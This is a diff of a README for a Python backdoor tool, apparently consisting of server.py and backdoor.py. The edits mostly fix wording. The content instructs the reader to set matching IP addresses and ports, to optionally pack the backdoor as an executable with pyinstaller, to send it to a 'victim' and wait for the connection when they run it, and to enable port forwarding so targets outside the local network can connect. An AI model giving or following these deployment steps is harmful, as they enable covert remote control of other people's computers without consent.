@@ -1,5 +1,5 @@
 # Backdoor
-**This is an advanced backdoor, created with Python.**
+This is an advanced backdoor, created with python.
 
 ## Options for the Backdoor:
 
@@ -42,9 +42,11 @@ To use the backdoor, first go to the server.py script, and change the IP given t
 3) The ports given in server.py and backdoor.py should match.
 4) If you want to you can convert this backdoor to be executable using pyinstaller.
 
-Send to someone the backdoor, when they launch it, you should get a connection.
+Now you should be good to go.
+Start server.py and wait for the victim to open backdoor.py, when they launch it, you should get a connection.
 
+---
 
 ## Outside Local Netork
 To make sure that everything works, you will need to add one more setting, In order to allow people outside you local network to conntent to you, you need to enable IP-Forwarding in your router settings.
-[See more data about IP Forwarding](https://en.wikipedia.org/wiki/IP_routing)
+[See more data about IP Forwarding.](https://en.wikipedia.org/wiki/IP_routing)
